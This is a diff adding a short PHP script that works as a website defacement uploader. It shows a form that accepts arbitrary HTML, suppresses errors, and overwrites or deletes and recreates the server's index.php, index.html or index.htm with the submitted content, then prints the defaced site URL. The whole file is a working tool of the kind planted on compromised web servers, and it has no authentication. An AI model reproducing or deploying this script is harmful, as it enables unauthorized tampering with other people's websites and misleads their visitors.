@@ -1,0 +1,48 @@
+<?php	
+set_time_limit(0);
+error_reporting(0);
+echo'<center><form method="post">
+<textarea name="index" style="width: 600px; height: 400px;"></textarea><br><br>
+<input type="submit" value="UP INDEX" name="up" />
+</form></center>';
+
+$g = $_POST['up'];
+$index = $_POST['index'];
+
+if(isset($g) && $index != ""){
+	$root = $_SERVER['DOCUMENT_ROOT'];
+	$web = "http://".$_SERVER['HTTP_HOST']."/";
+	$pathe1= "$root/index.php";
+	$pathe2= "$root/index.html";
+	$pathe3= "$root/index.htm";
+	if (file_exists($pathe1)){
+		$pathe_index = fopen($pathe1,"w+");
+		$put_index = fwrite($pathe_index,$index);
+		if (!$put_index) {
+			unlink("$pathe1");
+			$put_index = fwrite($pathe_index,$index);
+		}
+	}
+	if (file_exists($pathe2)){
+		$pathe_index = fopen($pathe2,"w+");
+		$put_index = fwrite($pathe_index,$index);
+		if (!$put_index) {
+			unlink("$pathe2");
+			$put_index = fwrite($pathe_index,$index);
+		}
+	}
+	if (file_exists($pathe3)){
+		$pathe_index = fopen($pathe3,"w+");
+		$put_index = fwrite($pathe_index,$index);
+		if (!$put_index) {
+			unlink("$pathe3");
+			$put_index = fwrite($pathe_index,$index);
+		}
+	}
+	if (!file_exists($pathe1) && !file_exists($pathe2) && !file_exists($pathe3)){
+		$pathe_index = fopen($pathe2,"w+");
+		fwrite($pathe_index,$index);
+	}
+	echo "<center><br>./Done => <yourindex>$web</yourindex></center>";
+}
+?>
